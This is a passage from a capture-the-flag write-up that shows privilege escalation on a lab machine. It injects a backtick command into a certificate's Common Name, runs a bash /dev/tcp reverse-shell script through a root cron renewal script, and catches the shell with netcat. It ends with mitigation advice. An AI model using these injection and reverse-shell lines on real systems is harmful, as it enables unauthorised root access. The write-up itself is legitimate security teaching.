bill@broscience:/tmp/tmp.ML5bZVF2Ow$ cp temp.crt /home/bill/Certs/broscience.crt

bill@broscience:/tmp/tmp.ML5bZVF2Ow$ /opt/renew_cert.sh /home/bill/Certs/broscience.crt
C = CA, ST = QC, L = MTL, O = someOrg, OU = Unit, CN = MyName`id`, emailAddress = "test@test.com "

Country     => CA
State       => QC
Locality    => MTL
Org Name    => someOrg
Org Unit    => Unit
Common Name => MyName`id`
Email       => test@test.com

Generating certificate...
mv: target 'groups=1000(bill).crt' is not a directory
```

The command failed, but I could see that my code was executed.

I created a script to launch a reverse shell.

```bash
bill@broscience:/tmp/tmp.ML5bZVF2Ow$ cat /tmp/tmp.ML5bZVF2Ow/rce.sh
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'
```

Then I created a certificate that would trigger the execution of the script on renewal.

```bash
bill@broscience:/tmp/tmp.ML5bZVF2Ow$ openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout temp.key -out temp.crt -days 1 <<<"CA
QC
MTL
someOrg
Unit
MyName\`/tmp/tmp.ML5bZVF2Ow/rce.sh\`
test@test.com
"

bill@broscience:/tmp/tmp.ML5bZVF2Ow$ cp temp.crt /home/bill/Certs/broscience.crt
```

I copied the script, launched a netcat listener, and waited for root to renew the certificate.

```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.2] from (UNKNOWN) [10.10.11.195] 54574
bash: cannot set terminal process group (2910): Inappropriate ioctl for device
bash: no job control in this shell

root@broscience:~# cat /root/root.txt
cat /root/root.txt
REDACTED
```

## Mitigations

To secure this application, the first step is to remove the `img.php` file. This file is there only to serve images that are already in the webroot. A direct link would work for that.

The code that generates the activation code is vulnerable because it uses the time to seed the random number generation. The documentation to [srand](https://www.php.net/srand) says that it's not necessary to seed it, it's already done automatically. By seeding it with the time, it makes it easy to predict.

The biggest issue with the site was the unserialization of the cookie. Serialization allows executing code on serialization and unserialization. It should never be used on user data. The cookie was storing a single string for the theme. So it would be sufficient to just store the theme in the cookie. And then validate it against an allowed list of themes.

Once on the server, getting the user was pretty easy. The passwords were stored in the database after being hashed with a very weak hashing algorithm. md5 should not be used anymore. They tried to use a salt, but the salt was the same for every user. Hashcat was able to go through all the passwords in rockyou in 26 seconds, in a small virtual machine. And then, the password found was reused in SSH.

The last issue on the machine was the script that renew the certificate. This was running as root, using data provided by the user. It would have been safer to only act on files that were owned by root and that could not be modified by anyone else. And the arguments should have been escaped. According to this [StackExchange response](https://superuser.com/questions/163515/bash-how-to-pass-command-line-arguments-containing-special-characters#349036), using single quotes around the argument would be sufficient.

```bash
$ echo "$(id)"
uid=1000(kali) gid=1000(kali) groups=1000(kali)

$ echo '$(id)'
$(id)
```
